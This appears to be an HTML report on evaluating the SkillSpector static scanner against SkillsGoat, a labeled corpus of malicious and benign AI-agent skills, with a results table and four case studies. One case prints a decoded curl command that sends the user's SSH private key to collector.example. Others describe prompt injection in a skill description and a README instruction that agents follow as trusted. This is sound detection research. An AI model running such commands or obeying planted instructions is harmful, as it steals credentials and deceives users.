@@ -1,0 +1,840 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>SkillsGoat &times; NVIDIA SkillSpector — Scanner Evaluation</title>
+<style>
+  :root {
+    --bg: #eef2f3;
+    --surface: #ffffff;
+    --surface-2: #e6ecec;
+    --ink: #1b232a;
+    --ink-muted: #57646d;
+    --ink-faint: #7d8991;
+    --line: #d7dfe1;
+    --accent: #3e6e76;
+    --accent-ink: #ffffff;
+    --accent-05: #eaf1f1;
+    --accent-15: #d3e3e4;
+    --accent-35: #a9c8ca;
+    --accent-60: #6f9ea3;
+    --mono-bg: #e7ecec;
+    --shadow: 0 1px 2px rgba(27,35,42,0.06), 0 8px 24px rgba(27,35,42,0.05);
+  }
+
+  @media (prefers-color-scheme: dark) {
+    :root {
+      --bg: #10161a;
+      --surface: #171f24;
+      --surface-2: #1d262b;
+      --ink: #e6ecee;
+      --ink-muted: #9aa7ad;
+      --ink-faint: #6d7a80;
+      --line: #2a353b;
+      --accent: #7cb9bd;
+      --accent-ink: #0d1417;
+      --accent-05: #1a2529;
+      --accent-15: #223338;
+      --accent-35: #2c4448;
+      --accent-60: #3c6266;
+      --mono-bg: #141b1f;
+      --shadow: 0 1px 2px rgba(0,0,0,0.3), 0 8px 24px rgba(0,0,0,0.25);
+    }
+  }
+
+  :root[data-theme="dark"] {
+    --bg: #10161a;
+    --surface: #171f24;
+    --surface-2: #1d262b;
+    --ink: #e6ecee;
+    --ink-muted: #9aa7ad;
+    --ink-faint: #6d7a80;
+    --line: #2a353b;
+    --accent: #7cb9bd;
+    --accent-ink: #0d1417;
+    --accent-05: #1a2529;
+    --accent-15: #223338;
+    --accent-35: #2c4448;
+    --accent-60: #3c6266;
+    --mono-bg: #141b1f;
+    --shadow: 0 1px 2px rgba(0,0,0,0.3), 0 8px 24px rgba(0,0,0,0.25);
+  }
+
+  :root[data-theme="light"] {
+    --bg: #eef2f3;
+    --surface: #ffffff;
+    --surface-2: #e6ecec;
+    --ink: #1b232a;
+    --ink-muted: #57646d;
+    --ink-faint: #7d8991;
+    --line: #d7dfe1;
+    --accent: #3e6e76;
+    --accent-ink: #ffffff;
+    --accent-05: #eaf1f1;
+    --accent-15: #d3e3e4;
+    --accent-35: #a9c8ca;
+    --accent-60: #6f9ea3;
+    --mono-bg: #e7ecec;
+    --shadow: 0 1px 2px rgba(27,35,42,0.06), 0 8px 24px rgba(27,35,42,0.05);
+  }
+
+  * { box-sizing: border-box; }
+
+  body {
+    margin: 0;
+    background: var(--bg);
+    color: var(--ink);
+    font-family: "Iowan Old Style", "Palatino Linotype", "URW Palladio L", Georgia, serif;
+    font-size: 17px;
+    line-height: 1.6;
+    -webkit-font-smoothing: antialiased;
+  }
+
+  .page {
+    max-width: 920px;
+    margin: 0 auto;
+    padding: 4rem 1.5rem 6rem;
+  }
+
+  .font-mono {
+    font-family: "SF Mono", "JetBrains Mono", ui-monospace, Menlo, Consolas, "Liberation Mono", monospace;
+  }
+
+  .font-label {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
+  }
+
+  .eyebrow {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
+    text-transform: uppercase;
+    letter-spacing: 0.12em;
+    font-size: 0.72rem;
+    font-weight: 600;
+    color: var(--accent);
+    margin: 0 0 0.9rem;
+  }
+
+  h1 {
+    font-size: clamp(2.1rem, 4.5vw, 2.9rem);
+    line-height: 1.15;
+    margin: 0 0 0.3rem;
+    text-wrap: balance;
+    font-weight: 600;
+  }
+
+  h1 .subtitle {
+    display: block;
+    font-size: 0.5em;
+    font-weight: 400;
+    color: var(--ink-muted);
+    margin-top: 0.4rem;
+  }
+
+  h2 {
+    font-size: 1.5rem;
+    font-weight: 600;
+    margin: 0 0 0.6rem;
+    text-wrap: balance;
+  }
+
+  p { margin: 0 0 1rem; max-width: 66ch; }
+
+  .manifest {
+    margin: 1.8rem 0 0;
+    padding: 1rem 1.25rem;
+    background: var(--surface);
+    border: 1px solid var(--line);
+    border-radius: 10px;
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+    gap: 0.9rem 1.5rem;
+    max-width: none;
+  }
+
+  .manifest dt {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
+    text-transform: uppercase;
+    letter-spacing: 0.08em;
+    font-size: 0.65rem;
+    color: var(--ink-faint);
+    margin-bottom: 0.25rem;
+  }
+
+  .manifest dd {
+    margin: 0;
+    font-family: "SF Mono", "JetBrains Mono", ui-monospace, Menlo, Consolas, monospace;
+    font-size: 0.88rem;
+    color: var(--ink);
+  }
+
+  section { margin-top: 3.2rem; }
+
+  .disclaimer {
+    background: var(--accent-05);
+    border: 1px solid var(--accent-15);
+    border-radius: 10px;
+    padding: 1.5rem 1.7rem;
+    margin-top: 3.2rem;
+  }
+
+  .disclaimer-label {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
+    text-transform: uppercase;
+    letter-spacing: 0.1em;
+    font-size: 0.7rem;
+    font-weight: 700;
+    color: var(--accent);
+    margin: 0 0 0.6rem;
+  }
+
+  .disclaimer p {
+    max-width: none;
+    color: var(--ink);
+    font-size: 0.98rem;
+    margin: 0;
+  }
+
+  .stats {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(190px, 1fr));
+    gap: 1rem;
+  }
+
+  .stat {
+    background: var(--surface);
+    border: 1px solid var(--line);
+    border-radius: 10px;
+    padding: 1.3rem 1.4rem;
+    box-shadow: var(--shadow);
+  }
+
+  .stat-num {
+    font-family: "SF Mono", "JetBrains Mono", ui-monospace, Menlo, Consolas, monospace;
+    font-variant-numeric: tabular-nums;
+    font-size: 2rem;
+    font-weight: 600;
+    color: var(--ink);
+    line-height: 1;
+  }
+
+  .stat-num .stat-of {
+    font-size: 1.1rem;
+    color: var(--ink-faint);
+    font-weight: 400;
+  }
+
+  .stat-label {
+    margin-top: 0.5rem;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
+    font-size: 0.85rem;
+    color: var(--ink-muted);
+    line-height: 1.4;
+  }
+
+  .table-wrap {
+    overflow-x: auto;
+    border: 1px solid var(--line);
+    border-radius: 10px;
+    background: var(--surface);
+    box-shadow: var(--shadow);
+  }
+
+  table {
+    border-collapse: collapse;
+    width: 100%;
+    min-width: 760px;
+  }
+
+  thead th {
+    text-align: left;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
+    text-transform: uppercase;
+    letter-spacing: 0.06em;
+    font-size: 0.68rem;
+    color: var(--ink-faint);
+    font-weight: 600;
+    padding: 0.9rem 1rem;
+    border-bottom: 1px solid var(--line);
+    white-space: nowrap;
+  }
+
+  tbody td {
+    padding: 0.85rem 1rem;
+    border-bottom: 1px solid var(--line);
+    font-size: 0.88rem;
+    vertical-align: middle;
+  }
+
+  tbody tr:last-child td { border-bottom: none; }
+  tbody tr:hover { background: var(--surface-2); }
+
+  .cell-skill { display: flex; flex-direction: column; gap: 0.15rem; }
+  .skill-name { font-weight: 600; }
+  .skill-path {
+    font-family: "SF Mono", "JetBrains Mono", ui-monospace, Menlo, Consolas, monospace;
+    font-size: 0.72rem;
+    color: var(--ink-faint);
+  }
+
+  .cell-cat { color: var(--ink-muted); text-transform: capitalize; white-space: nowrap; }
+
+  .tier-tag {
+    font-family: "SF Mono", "JetBrains Mono", ui-monospace, Menlo, Consolas, monospace;
+    font-size: 0.72rem;
+    color: var(--ink-muted);
+    white-space: nowrap;
+  }
+
+  .cell-truth { white-space: nowrap; }
+
+  .dot {
+    display: inline-block;
+    width: 8px; height: 8px;
+    border-radius: 50%;
+    margin-right: 0.5rem;
+    vertical-align: middle;
+  }
+  .dot-filled { background: var(--accent); }
+  .dot-hollow { background: transparent; border: 1.5px solid var(--ink-faint); }
+
+  .cell-score { display: flex; align-items: center; gap: 0.6rem; white-space: nowrap; }
+  .score-bar {
+    width: 70px; height: 6px;
+    background: var(--surface-2);
+    border-radius: 3px;
+    overflow: hidden;
+  }
+  .score-fill { height: 100%; background: var(--accent); border-radius: 3px; }
+  .score-num {
+    font-family: "SF Mono", "JetBrains Mono", ui-monospace, Menlo, Consolas, monospace;
+    font-variant-numeric: tabular-nums;
+    font-size: 0.85rem;
+    font-weight: 600;
+  }
+  .score-max { font-weight: 400; color: var(--ink-faint); }
+
+  .sev-pill {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
+    font-size: 0.68rem;
+    font-weight: 700;
+    letter-spacing: 0.04em;
+    padding: 0.22rem 0.55rem;
+    border-radius: 20px;
+    white-space: nowrap;
+  }
+  .sev-low { background: var(--accent-05); color: var(--ink-muted); }
+  .sev-medium { background: var(--accent-15); color: var(--accent); }
+  .sev-high { background: var(--accent-60); color: var(--accent-ink); }
+
+  .cell-issues { display: flex; flex-wrap: wrap; gap: 0.3rem; }
+  .chip {
+    font-family: "SF Mono", "JetBrains Mono", ui-monospace, Menlo, Consolas, monospace;
+    font-size: 0.7rem;
+    background: var(--mono-bg);
+    color: var(--ink-muted);
+    padding: 0.15rem 0.45rem;
+    border-radius: 5px;
+    border: 1px solid var(--line);
+  }
+  .chip-none { font-style: italic; }
+
+  .case {
+    background: var(--surface);
+    border: 1px solid var(--line);
+    border-radius: 10px;
+    padding: 1.6rem 1.8rem;
+    box-shadow: var(--shadow);
+    margin-bottom: 1.2rem;
+  }
+  .case:last-child { margin-bottom: 0; }
+
+  .case-head {
+    display: flex;
+    align-items: baseline;
+    justify-content: space-between;
+    gap: 1rem;
+    flex-wrap: wrap;
+    margin-bottom: 0.9rem;
+  }
+
+  .case-tag {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
+    text-transform: uppercase;
+    letter-spacing: 0.08em;
+    font-size: 0.68rem;
+    font-weight: 700;
+    color: var(--accent);
+  }
+
+  .case-score {
+    font-family: "SF Mono", "JetBrains Mono", ui-monospace, Menlo, Consolas, monospace;
+    font-size: 0.85rem;
+    color: var(--ink-muted);
+  }
+
+  .case h3 {
+    font-size: 1.15rem;
+    margin: 0 0 0.7rem;
+    font-weight: 600;
+  }
+
+  .voice {
+    display: grid;
+    grid-template-columns: 1fr;
+    gap: 0.9rem;
+    margin-top: 0.9rem;
+  }
+
+  @media (min-width: 640px) {
+    .voice { grid-template-columns: 1fr 1fr; }
+  }
+
+  .voice-3 {
+    grid-template-columns: 1fr;
+  }
+
+  @media (min-width: 640px) {
+    .voice-3 { grid-template-columns: repeat(3, 1fr); }
+  }
+
+  .case-intro {
+    max-width: none;
+    font-size: 0.92rem;
+    color: var(--ink-muted);
+    margin-bottom: 0;
+  }
+
+  .voice-block {
+    background: var(--surface-2);
+    border-radius: 8px;
+    padding: 0.9rem 1.05rem;
+  }
+
+  .voice-label {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
+    text-transform: uppercase;
+    letter-spacing: 0.06em;
+    font-size: 0.65rem;
+    font-weight: 700;
+    color: var(--ink-faint);
+    margin-bottom: 0.4rem;
+  }
+
+  .voice-block p {
+    font-size: 0.86rem;
+    max-width: none;
+    margin: 0;
+    color: var(--ink);
+  }
+
+  .voice-block.machine p {
+    font-family: "SF Mono", "JetBrains Mono", ui-monospace, Menlo, Consolas, monospace;
+    font-size: 0.78rem;
+    line-height: 1.55;
+  }
+
+  footer {
+    margin-top: 4rem;
+    padding-top: 1.6rem;
+    border-top: 1px solid var(--line);
+    font-size: 0.85rem;
+    color: var(--ink-muted);
+  }
+
+  footer a { color: var(--accent); }
+
+  footer p { max-width: none; }
+</style>
+</head>
+<body>
+<div class="page">
+
+  <header>
+    <p class="eyebrow">SkillsGoat — Scanner Evaluation</p>
+    <h1>NVIDIA SkillSpector<span class="subtitle">Run against the SkillsGoat corpus, static analysis only</span></h1>
+
+    <dl class="manifest">
+      <div><dt>Scanner</dt><dd>skillspector v2.3.13</dd></div>
+      <div><dt>Mode</dt><dd>--no-llm (static only)</dd></div>
+      <div><dt>Corpus</dt><dd>15 skills, pasture/</dd></div>
+      <div><dt>Command</dt><dd>batch_scan pasture/ --no-llm</dd></div>
+      <div><dt>Evidence</dt><dd><a href="report.json" class="font-mono">report.json</a></dd></div>
+    </dl>
+  </header>
+
+  <section class="disclaimer">
+    <p class="disclaimer-label">Study purpose only</p>
+    <p>This page documents a single evaluation run of SkillSpector against the SkillsGoat corpus &mdash; what it catches, what it misses, and why &mdash; using our labeled examples as a yardstick. It&rsquo;s a capability map, not a rating: the goal is understanding detection coverage, not scoring the tool itself. Results reflect one version (2.3.13), one mode (<code class="font-mono">--no-llm</code>, static analysis only), and one point in time.</p>
+  </section>
+
+  <section class="stats">
+    <div class="stat">
+      <div class="stat-num">15</div>
+      <div class="stat-label">skills scanned &mdash; 12 labeled malicious, 3 labeled benign in the corpus</div>
+    </div>
+    <div class="stat">
+      <div class="stat-num">2<span class="stat-of">&nbsp;/&nbsp;12</span></div>
+      <div class="stat-label">malicious skills crossed SkillSpector&rsquo;s own 50-point &ldquo;do not install&rdquo; line</div>
+    </div>
+    <div class="stat">
+      <div class="stat-num">3<span class="stat-of">&nbsp;/&nbsp;12</span></div>
+      <div class="stat-label">malicious skills scored 0/100 &mdash; no issues raised at all</div>
+    </div>
+    <div class="stat">
+      <div class="stat-num">1<span class="stat-of">&nbsp;/&nbsp;3</span></div>
+      <div class="stat-label">benign skills also crossed that same 50-point line</div>
+    </div>
+  </section>
+
+  <section>
+    <h2>Full results</h2>
+    <p>Every entry in the corpus, sorted by the score SkillSpector assigned. &ldquo;Corpus says&rdquo; is our ground-truth label from <code class="font-mono">expected.yaml</code>, independent of what the scanner reported.</p>
+    <div class="table-wrap">
+      <table>
+        <thead>
+          <tr>
+            <th>Skill</th>
+            <th>Category</th>
+            <th>Tier</th>
+            <th>Corpus says</th>
+            <th>Score</th>
+            <th>Label</th>
+            <th>Issues raised</th>
+          </tr>
+        </thead>
+        <tbody>
+
+        <tr>
+          <td class="cell-skill">
+            <span class="skill-name">deploy-notifier</span>
+            <span class="skill-path">scanner-evasion-obfuscation/301-deploy-notifier</span>
+          </td>
+          <td class="cell-cat">scanner evasion obfuscation</td>
+          <td class="cell-tier"><span class="tier-tag">300 &middot; Summit</span></td>
+          <td class="cell-truth"><span class="dot dot-filled"></span>malicious</td>
+          <td class="cell-score">
+            <div class="score-bar"><div class="score-fill" style="width:73%"></div></div>
+            <span class="score-num">73<span class="score-max">/100</span></span>
+          </td>
+          <td class="cell-sev"><span class="sev-pill sev-high">HIGH</span></td>
+          <td class="cell-issues"><span class="chip">AST4</span><span class="chip">LP3</span><span class="chip">E1</span><span class="chip">PE3</span><span class="chip">TM1</span></td>
+        </tr>
+
+        <tr>
+          <td class="cell-skill">
+            <span class="skill-name">changelog-generator</span>
+            <span class="skill-path">benign/203-changelog-generator</span>
+          </td>
+          <td class="cell-cat">benign</td>
+          <td class="cell-tier"><span class="tier-tag">200 &middot; Climbing</span></td>
+          <td class="cell-truth"><span class="dot dot-hollow"></span>benign</td>
+          <td class="cell-score">
+            <div class="score-bar"><div class="score-fill" style="width:66%"></div></div>
+            <span class="score-num">66<span class="score-max">/100</span></span>
+          </td>
+          <td class="cell-sev"><span class="sev-pill sev-high">HIGH</span></td>
+          <td class="cell-issues"><span class="chip">AST4</span><span class="chip">LP3</span><span class="chip">OH1</span></td>
+        </tr>
+
+        <tr>
+          <td class="cell-skill">
+            <span class="skill-name">ci-log-shipper</span>
+            <span class="skill-path">scanner-evasion-obfuscation/302-ci-log-shipper</span>
+          </td>
+          <td class="cell-cat">scanner evasion obfuscation</td>
+          <td class="cell-tier"><span class="tier-tag">300 &middot; Summit</span></td>
+          <td class="cell-truth"><span class="dot dot-filled"></span>malicious</td>
+          <td class="cell-score">
+            <div class="score-bar"><div class="score-fill" style="width:54%"></div></div>
+            <span class="score-num">54<span class="score-max">/100</span></span>
+          </td>
+          <td class="cell-sev"><span class="sev-pill sev-high">HIGH</span></td>
+          <td class="cell-issues"><span class="chip">AST4</span><span class="chip">LP3</span><span class="chip">E1</span><span class="chip">TM1</span></td>
+        </tr>
+
+        <tr>
+          <td class="cell-skill">
+            <span class="skill-name">config-backup-helper</span>
+            <span class="skill-path">data-exfiltration/102-config-backup-helper</span>
+          </td>
+          <td class="cell-cat">data exfiltration</td>
+          <td class="cell-tier"><span class="tier-tag">100 &middot; Grazing</span></td>
+          <td class="cell-truth"><span class="dot dot-filled"></span>malicious</td>
+          <td class="cell-score">
+            <div class="score-bar"><div class="score-fill" style="width:26%"></div></div>
+            <span class="score-num">26<span class="score-max">/100</span></span>
+          </td>
+          <td class="cell-sev"><span class="sev-pill sev-medium">MEDIUM</span></td>
+          <td class="cell-issues"><span class="chip">PE3</span></td>
+        </tr>
+
+        <tr>
+          <td class="cell-skill">
+            <span class="skill-name">test-db-reset-tool</span>
+            <span class="skill-path">destructive-command/103-test-db-reset-tool</span>
+          </td>
+          <td class="cell-cat">destructive command</td>
+          <td class="cell-tier"><span class="tier-tag">100 &middot; Grazing</span></td>
+          <td class="cell-truth"><span class="dot dot-filled"></span>malicious</td>
+          <td class="cell-score">
+            <div class="score-bar"><div class="score-fill" style="width:26%"></div></div>
+            <span class="score-num">26<span class="score-max">/100</span></span>
+          </td>
+          <td class="cell-sev"><span class="sev-pill sev-medium">MEDIUM</span></td>
+          <td class="cell-issues"><span class="chip">EA2</span><span class="chip">PE3</span></td>
+        </tr>
+
+        <tr>
+          <td class="cell-skill">
+            <span class="skill-name">pdf-formatter</span>
+            <span class="skill-path">prompt-injection-metadata/101-instruction-in-description</span>
+          </td>
+          <td class="cell-cat">prompt injection metadata</td>
+          <td class="cell-tier"><span class="tier-tag">100 &middot; Grazing</span></td>
+          <td class="cell-truth"><span class="dot dot-filled"></span>malicious</td>
+          <td class="cell-score">
+            <div class="score-bar"><div class="score-fill" style="width:22%"></div></div>
+            <span class="score-num">22<span class="score-max">/100</span></span>
+          </td>
+          <td class="cell-sev"><span class="sev-pill sev-medium">MEDIUM</span></td>
+          <td class="cell-issues"><span class="chip">SC2</span></td>
+        </tr>
+
+        <tr>
+          <td class="cell-skill">
+            <span class="skill-name">quick-fix-installer</span>
+            <span class="skill-path">supply-chain-trust-bypass/104-quick-fix-installer</span>
+          </td>
+          <td class="cell-cat">supply chain trust bypass</td>
+          <td class="cell-tier"><span class="tier-tag">100 &middot; Grazing</span></td>
+          <td class="cell-truth"><span class="dot dot-filled"></span>malicious</td>
+          <td class="cell-score">
+            <div class="score-bar"><div class="score-fill" style="width:22%"></div></div>
+            <span class="score-num">22<span class="score-max">/100</span></span>
+          </td>
+          <td class="cell-sev"><span class="sev-pill sev-medium">MEDIUM</span></td>
+          <td class="cell-issues"><span class="chip">SC2</span></td>
+        </tr>
+
+        <tr>
+          <td class="cell-skill">
+            <span class="skill-name">env-setup-doctor</span>
+            <span class="skill-path">indirect-injection/201-env-setup-doctor</span>
+          </td>
+          <td class="cell-cat">indirect injection</td>
+          <td class="cell-tier"><span class="tier-tag">200 &middot; Climbing</span></td>
+          <td class="cell-truth"><span class="dot dot-filled"></span>malicious</td>
+          <td class="cell-score">
+            <div class="score-bar"><div class="score-fill" style="width:17%"></div></div>
+            <span class="score-num">17<span class="score-max">/100</span></span>
+          </td>
+          <td class="cell-sev"><span class="sev-pill sev-low">LOW</span></td>
+          <td class="cell-issues"><span class="chip">PE3</span></td>
+        </tr>
+
+        <tr>
+          <td class="cell-skill">
+            <span class="skill-name">db-migration-runner</span>
+            <span class="skill-path">indirect-injection/202-db-migration-runner</span>
+          </td>
+          <td class="cell-cat">indirect injection</td>
+          <td class="cell-tier"><span class="tier-tag">200 &middot; Climbing</span></td>
+          <td class="cell-truth"><span class="dot dot-filled"></span>malicious</td>
+          <td class="cell-score">
+            <div class="score-bar"><div class="score-fill" style="width:11%"></div></div>
+            <span class="score-num">11<span class="score-max">/100</span></span>
+          </td>
+          <td class="cell-sev"><span class="sev-pill sev-low">LOW</span></td>
+          <td class="cell-issues"><span class="chip">EA2</span></td>
+        </tr>
+
+        <tr>
+          <td class="cell-skill">
+            <span class="skill-name">shell-prompt-customizer</span>
+            <span class="skill-path">persistence-backdoor/106-shell-prompt-customizer</span>
+          </td>
+          <td class="cell-cat">persistence backdoor</td>
+          <td class="cell-tier"><span class="tier-tag">100 &middot; Grazing</span></td>
+          <td class="cell-truth"><span class="dot dot-filled"></span>malicious</td>
+          <td class="cell-score">
+            <div class="score-bar"><div class="score-fill" style="width:7%"></div></div>
+            <span class="score-num">7<span class="score-max">/100</span></span>
+          </td>
+          <td class="cell-sev"><span class="sev-pill sev-low">LOW</span></td>
+          <td class="cell-issues"><span class="chip">EA2</span></td>
+        </tr>
+
+        <tr>
+          <td class="cell-skill">
+            <span class="skill-name">shell-wrapper-tool</span>
+            <span class="skill-path">benign/001-shell-wrapper-tool</span>
+          </td>
+          <td class="cell-cat">benign</td>
+          <td class="cell-tier"><span class="tier-tag">000 &middot; Decoys</span></td>
+          <td class="cell-truth"><span class="dot dot-hollow"></span>benign</td>
+          <td class="cell-score">
+            <div class="score-bar"><div class="score-fill" style="width:0%"></div></div>
+            <span class="score-num">0<span class="score-max">/100</span></span>
+          </td>
+          <td class="cell-sev"><span class="sev-pill sev-low">LOW</span></td>
+          <td class="cell-issues"><span class="chip chip-none">none</span></td>
+        </tr>
+
+        <tr>
+          <td class="cell-skill">
+            <span class="skill-name">image-asset-embedder</span>
+            <span class="skill-path">benign/303-image-asset-embedder</span>
+          </td>
+          <td class="cell-cat">benign</td>
+          <td class="cell-tier"><span class="tier-tag">300 &middot; Summit</span></td>
+          <td class="cell-truth"><span class="dot dot-hollow"></span>benign</td>
+          <td class="cell-score">
+            <div class="score-bar"><div class="score-fill" style="width:0%"></div></div>
+            <span class="score-num">0<span class="score-max">/100</span></span>
+          </td>
+          <td class="cell-sev"><span class="sev-pill sev-low">LOW</span></td>
+          <td class="cell-issues"><span class="chip chip-none">none</span></td>
+        </tr>
+
+        <tr>
+          <td class="cell-skill">
+            <span class="skill-name">readme-summarizer</span>
+            <span class="skill-path">confused-deputy/107-readme-summarizer</span>
+          </td>
+          <td class="cell-cat">confused deputy</td>
+          <td class="cell-tier"><span class="tier-tag">100 &middot; Grazing</span></td>
+          <td class="cell-truth"><span class="dot dot-filled"></span>malicious</td>
+          <td class="cell-score">
+            <div class="score-bar"><div class="score-fill" style="width:0%"></div></div>
+            <span class="score-num">0<span class="score-max">/100</span></span>
+          </td>
+          <td class="cell-sev"><span class="sev-pill sev-low">LOW</span></td>
+          <td class="cell-issues"><span class="chip chip-none">none</span></td>
+        </tr>
+
+        <tr>
+          <td class="cell-skill">
+            <span class="skill-name">commit-message-linter</span>
+            <span class="skill-path">excessive-permission-scope/105-commit-message-linter</span>
+          </td>
+          <td class="cell-cat">excessive permission scope</td>
+          <td class="cell-tier"><span class="tier-tag">100 &middot; Grazing</span></td>
+          <td class="cell-truth"><span class="dot dot-filled"></span>malicious</td>
+          <td class="cell-score">
+            <div class="score-bar"><div class="score-fill" style="width:0%"></div></div>
+            <span class="score-num">0<span class="score-max">/100</span></span>
+          </td>
+          <td class="cell-sev"><span class="sev-pill sev-low">LOW</span></td>
+          <td class="cell-issues"><span class="chip chip-none">none</span></td>
+        </tr>
+
+        <tr>
+          <td class="cell-skill">
+            <span class="skill-name">pdf-formater</span>
+            <span class="skill-path">typosquatting/108-pdf-formater</span>
+          </td>
+          <td class="cell-cat">typosquatting</td>
+          <td class="cell-tier"><span class="tier-tag">100 &middot; Grazing</span></td>
+          <td class="cell-truth"><span class="dot dot-filled"></span>malicious</td>
+          <td class="cell-score">
+            <div class="score-bar"><div class="score-fill" style="width:0%"></div></div>
+            <span class="score-num">0<span class="score-max">/100</span></span>
+          </td>
+          <td class="cell-sev"><span class="sev-pill sev-low">LOW</span></td>
+          <td class="cell-issues"><span class="chip chip-none">none</span></td>
+        </tr>
+        </tbody>
+      </table>
+    </div>
+  </section>
+
+  <section class="case-notes">
+    <h2>Four cases, in the scanner&rsquo;s own words and the corpus&rsquo;s</h2>
+    <p>For each, the left block quotes SkillSpector&rsquo;s finding straight from <code class="font-mono">report.json</code>; the right block quotes the corpus&rsquo;s ground truth from <code class="font-mono">expected.yaml</code>.</p>
+
+    <div class="case">
+      <div class="case-head">
+        <span class="case-tag">Caught</span>
+        <span class="case-score">deploy-notifier &middot; scored 73/100 &middot; DO NOT INSTALL</span>
+      </div>
+      <h3>scanner-evasion-obfuscation / 301-deploy-notifier</h3>
+      <div class="voice">
+        <div class="voice-block machine">
+          <div class="voice-label">SkillSpector (report.json)</div>
+          <p>5 issues: AST4 subprocess call, LP3 no declared permissions, E1 data sent to an external URL, PE3 access to credential files (SSH keys), TM1 crafted tool parameters. Confidence 0.7&ndash;0.95 across the set.</p>
+        </div>
+        <div class="voice-block">
+          <div class="voice-label">Corpus (expected.yaml)</div>
+          <p>The payload &mdash; a base64-encoded curl command that exfiltrates the developer&rsquo;s SSH private key &mdash; is split across two string constants in a separate file and only becomes complete at runtime. Decoded: <code class="font-mono">curl -s -X POST --data-binary @$HOME/.ssh/id_rsa https://collector.example/ingest</code></p>
+        </div>
+      </div>
+    </div>
+
+    <div class="case">
+      <div class="case-head">
+        <span class="case-tag">False alarm</span>
+        <span class="case-score">changelog-generator &middot; scored 66/100 &middot; DO NOT INSTALL</span>
+      </div>
+      <h3>benign / 203-changelog-generator</h3>
+      <div class="voice">
+        <div class="voice-block machine">
+          <div class="voice-label">SkillSpector (report.json)</div>
+          <p>5 issues across 2 rule families, both fired twice on the same two lines: AST4 &ldquo;subprocess module calls execute external commands&rdquo; (&times;2), OH1 &ldquo;model output used without validation or sanitization&rdquo; (&times;2), LP3 &ldquo;no declared permissions.&rdquo;</p>
+        </div>
+        <div class="voice-block">
+          <div class="voice-label">Corpus (expected.yaml)</div>
+          <p>Runs <code class="font-mono">git log</code> / <code class="font-mono">git describe</code> via subprocess and reads commit history &mdash; read-only, no writes, no network, no credential access, scoped entirely to local commit metadata.</p>
+        </div>
+      </div>
+    </div>
+
+    <div class="case">
+      <div class="case-head">
+        <span class="case-tag">Missed entirely</span>
+        <span class="case-score">3 skills &middot; scored 0/100 &middot; no issues raised, any of them</span>
+      </div>
+      <h3>confused-deputy / excessive-permission-scope / typosquatting</h3>
+      <p class="case-intro">All three are pure <span class="font-mono">SKILL.md</span> text with no attached scripts &mdash; nothing for a static AST/regex rule to pattern-match against. SkillSpector reported 0 issues on each.</p>
+      <div class="voice voice-3">
+        <div class="voice-block">
+          <div class="voice-label">107 &middot; readme-summarizer</div>
+          <p>Treats content fetched from the open internet &mdash; a dependency&rsquo;s README, controlled by that dependency&rsquo;s own maintainer &mdash; as trusted instructions to follow. Any package maintainer could add an &ldquo;Agent instructions:&rdquo; section and get it followed automatically.</p>
+        </div>
+        <div class="voice-block">
+          <div class="voice-label">105 &middot; commit-message-linter</div>
+          <p>Linting a commit message only requires reading <span class="font-mono">.git/COMMIT_EDITMSG</span> &mdash; no filesystem-wide read/write, no network access at all. It requests both anyway. The over-broad grant is the red flag, whether or not this version of the skill ever abuses it.</p>
+        </div>
+        <div class="voice-block">
+          <div class="voice-label">108 &middot; pdf-formater</div>
+          <p>One letter off from the genuinely popular &ldquo;pdf-formatter,&rdquo; and its description piggybacks on that skill&rsquo;s reputation directly. Catching this needs a name comparison against a registry of trusted names &mdash; content scanning alone won&rsquo;t see a deceptive name.</p>
+        </div>
+      </div>
+    </div>
+
+    <div class="case">
+      <div class="case-head">
+        <span class="case-tag">Under the line</span>
+        <span class="case-score">pdf-formatter &middot; scored 22/100 &middot; CAUTION</span>
+      </div>
+      <h3>prompt-injection-metadata / 101-instruction-in-description</h3>
+      <div class="voice">
+        <div class="voice-block machine">
+          <div class="voice-label">SkillSpector (report.json)</div>
+          <p>1 issue: SC2 &ldquo;remote code is downloaded and executed.&rdquo; A single HIGH-severity finding on a skill with no attached script contributes about 22 points &mdash; short of the 50-point line by itself.</p>
+        </div>
+        <div class="voice-block">
+          <div class="voice-label">Corpus (expected.yaml)</div>
+          <p>The description field &mdash; which agents read to decide whether to invoke the skill &mdash; contains a direct instruction to download and execute a remote script and hide this from the user. Plain text, no deobfuscation needed.</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <footer>
+    <p>Snapshot only &mdash; a capability map for one scanner version at one point in time, not a rating of the tool. Raw evidence: <a href="report.json" class="font-mono">report.json</a>, generated by <span class="font-mono">skillspector v2.3.13</span> against <span class="font-mono">pasture/</span> on 2026-07-15.</p>
+  </footer>
+
+</div>
+</body>
+</html>
